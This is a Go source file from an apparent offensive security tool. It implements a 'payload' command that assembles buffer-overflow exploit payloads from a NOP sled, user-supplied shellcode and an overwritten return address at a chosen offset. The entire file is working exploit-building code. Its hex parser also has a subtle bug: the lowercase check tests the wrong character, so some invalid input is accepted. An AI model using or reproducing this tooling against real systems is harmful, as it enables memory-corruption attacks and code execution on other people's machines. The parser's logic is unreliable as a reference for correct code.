package command

import (
	"fmt"

	"github.com/hashibuto/artillery"
	"github.com/hashibuto/shellfire/internal/buffer"
)

var malformedHexStringErr = fmt.Errorf("Malformed hex string, should take the following form \\xed\\x32\\x44\\x55")

var PayloadCommand = &artillery.Command{
	Name:        "payload",
	Description: "generates a shellcode payload for a buffer overflow",
	Arguments: []*artillery.Argument{
		{
			Name:        "offset",
			Description: "buffer offset where return address will be written",
			Type:        artillery.Int,
		},
		{
			Name:        "returnAddress",
			Description: "return address in highest-to-lowest hex format (eg. \\xed\\x32\\x44\\x55)",
		},
		{
			Name:        "shellcode",
			Description: "shellcode in hex string format (eg. \\xed\\x32\\x44\\x55\\xed\\x32\\x44\\x55)",
		},
	},
	Options: []*artillery.Option{
		{
			Name:        "append",
			ShortName:   'a',
			Description: "append shellcode after return address",
			Type:        artillery.Bool,
			Value:       true,
		},
		{
			Name:        "nsb",
			ShortName:   'n',
			Description: "number of nopsled bytes to insert (defaults to half the remaining buffer space)",
			Type:        artillery.Int,
		},
		{
			Name:        "hex",
			ShortName:   'h',
			Description: "output in hex format for visualization purposes",
			Type:        artillery.Bool,
			Value:       true,
		},
		{
			Name:        "big",
			ShortName:   'b',
			Description: "specify big-endian byte order",
			Type:        artillery.Bool,
			Value:       true,
		},
	},
	OnExecute: makePayload,
}

// makePayload generates a buffer payload containingthe provided shellcode
func makePayload(n artillery.Namespace, p *artillery.Processor) error {
	var args struct {
		Append        bool
		Big           bool
		Hex           bool
		Nsb           int
		Offset        int
		ReturnAddress string
		Shellcode     string
	}
	artillery.Reflect(n, &args)

	shellcodeBytes, err := parseHexString(args.Shellcode)
	if err != nil {
		return err
	}
	returnAddressBytes, err := parseHexString(args.ReturnAddress)
	if err != nil {
		return err
	}

	if len(shellcodeBytes) > args.Offset {
		return fmt.Errorf("Shellcode is larger than the target buffer")
	}

	if args.Nsb > args.Offset-len(shellcodeBytes) {
		return fmt.Errorf("Nopsled is too long for the provided buffer")
	}

	endOfReturn := args.Offset + len(returnAddressBytes)
	totalSize := endOfReturn
	if args.Append {
		totalSize += len(shellcodeBytes)
	}

	// Init with NOP
	b := buffer.NewBuffer(totalSize, 0x90)

	var offset int
	if args.Append {
		offset = endOfReturn
	} else {
		if args.Nsb > 0 {
			offset = args.Nsb
		} else {
			offset = int((args.Offset - len(shellcodeBytes)) / 2)
		}
	}

	b.CopyTo(shellcodeBytes, offset)
	if args.Big {
		b.RevCopyTo(returnAddressBytes, args.Offset)
	} else {
		b.CopyTo(returnAddressBytes, args.Offset)
	}

	err = b.Validate()
	if err != nil {
		return err
	}
	b.Stdout(args.Hex)
	return nil
}

// parseHexString parses a hex string in the form of \x03\x02\x04 and returns a byte array
func parseHexString(hexString string) ([]byte, error) {
	if len(hexString)%4 != 0 {
		return nil, fmt.Errorf("Error: %w - \"%s\"", malformedHexStringErr, hexString)
	}
	ret := make([]byte, len(hexString)/4)

	pos := 0
	for i := 0; i < len(hexString); i += 4 {
		subStr := hexString[i : i+4]
		if subStr[0] != '\\' {
			return nil, fmt.Errorf("Error: %w - \"%s\"", malformedHexStringErr, subStr)
		}
		if subStr[1] != 'x' && subStr[1] != 'X' {
			return nil, fmt.Errorf("Error: %w - \"%s\"", malformedHexStringErr, subStr)
		}
		var total byte
		for j := 0; j < 2; j++ {
			offset := 2 + j
			scale := 4
			if j == 1 {
				scale = 0
			}
			if subStr[offset] >= 48 && subStr[offset] <= 57 {
				total += (subStr[offset] - 48) << scale
			} else if subStr[offset] >= 65 && subStr[offset] <= 70 {
				total += (subStr[offset] - 65 + 10) << scale
			} else if subStr[offset] >= 97 && subStr[2] <= 102 {
				total += (subStr[offset] - 97 + 10) << scale
			} else {
				return nil, fmt.Errorf("Error: %w - \"%s\"", malformedHexStringErr, subStr)
			}
		}

		ret[pos] = total
		pos++
	}

	return ret, nil
}
